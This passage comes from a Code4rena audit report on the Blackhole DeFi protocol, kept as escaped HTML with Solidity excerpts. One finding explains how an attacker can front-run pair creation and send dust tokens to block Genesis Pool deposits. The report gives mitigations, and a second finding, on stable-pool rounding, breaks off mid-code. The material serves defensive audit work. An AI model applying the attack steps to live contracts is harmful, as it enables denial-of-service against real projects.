class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;IA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Pair: IDENTICAL_ADDRESSES\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ? (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) : (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Pair: ZERO_ADDRESS\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;!ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIPairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreatePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Store in reverse direction\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eallPairs\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ePairCreated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eallPairs\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eVulnerable validation: In \u003ccode\u003eGenesisPoolManager.depositNativeToken()\u003c/code\u003e, the protocol checks whether the pair already exists. If so, it requires that both token balances in the pair are zero — but does not verify whether the pair was created by the protocol itself.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edepositNativeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eauctionIndex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGenesisInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisPoolInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTokenAllocation\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eallocationInfo\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//.................code\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_fundingToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_stable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;!ZV\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_fundingToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;!ZV\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//........................more code\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAttack Scenario:\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eAn attacker can observe a pending \u003ccode\u003ecreateGenesisPool\u003c/code\u003e transaction (or the \u003ccode\u003eGenesisCreated\u003c/code\u003e event). The attacker can:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCall \u003ccode\u003epairFactory.createPair(nativeToken\u003c/code\u003e, \u003ccode\u003efundingToken\u003c/code\u003e, \u003ccode\u003estable\u003c/code\u003e) to create a new, empty LP pair for the target tokens.\u003c/li\u003e\n\u003cli\u003eImmediately after, transfer a minimal non-zero amount (e.g., 1 wei) of both \u003ccode\u003enativeToken\u003c/code\u003e and \u003ccode\u003efundingToken\u003c/code\u003e directly to this newly created pair contract address.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"impact-4\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-4\" aria-label=\"impact 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eWhen the legitimate depo\u003ccode\u003esitNativeToken transaction executes,\u003c/code\u003epairFactory.getPair\u003ccode\u003ewill return the attacker's pair address. The require\u003c/code\u003e(IERC20(token).balanceOf(pairAddress) == 0, “!ZV”);\u003ccode\u003echecks will then fail because the pair now holds a non-zero balance of tokens. This causes the legitimate\u003c/code\u003edepositNativeToken` transaction to revert, resulting in:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDenial of Service (DoS): Legitimate projects are repeatedly blocked from launching their intended Genesis Pools.\u003c/li\u003e\n\u003cli\u003eGriefing: An attacker can perform this attack with minimal gas cost, making it a highly effective and low-cost method to disrupt the protocol’s core functionality.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eAdd pair ownership or Origin validation. Instead of just checking \u003ccode\u003ebalance == 0\u003c/code\u003e, validate that your protocol created the pair, or that the pair was expected.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Unmitigated. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-40\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-17\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-57\"\u003emaxvzuvex\u003c/a\u003e, and also included in the \u003ca href=\"#mitigation-review\"\u003eMitigation Review\u003c/a\u003e section below.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-06-first-liquidity-provider-can-dos-the-pool-of-a-stable-pair\" style=\"position:relative;\"\u003e\u003ca href=\"#m-06-first-liquidity-provider-can-dos-the-pool-of-a-stable-pair\" aria-label=\"m 06 first liquidity provider can dos the pool of a stable pair permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-185\"\u003e[M-06] First liquidity provider can DOS the pool of a stable pair\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-187\"\u003eZZhelev\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-461\"\u003ecu5t0mpeo\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/Pair.sol#L481\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/Pair.sol#L481\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/Pair.sol#L344\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/Pair.sol#L344\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-4\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-4\" aria-label=\"finding description 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eRounding errors in the calculation of the invariant \u003ccode\u003ek\u003c/code\u003e can result in zero value for stable pools, allowing malicious actors to DOS the pool.\u003c/p\u003e\n\u003cp\u003eIn the \u003ccode\u003ePair\u003c/code\u003e contract, the invariant \u003ccode\u003ek\u003c/code\u003e of a stable pool is calculated as follows:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_k\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_x\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edecimals0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_y\u003c/span\u003e\u003cspan 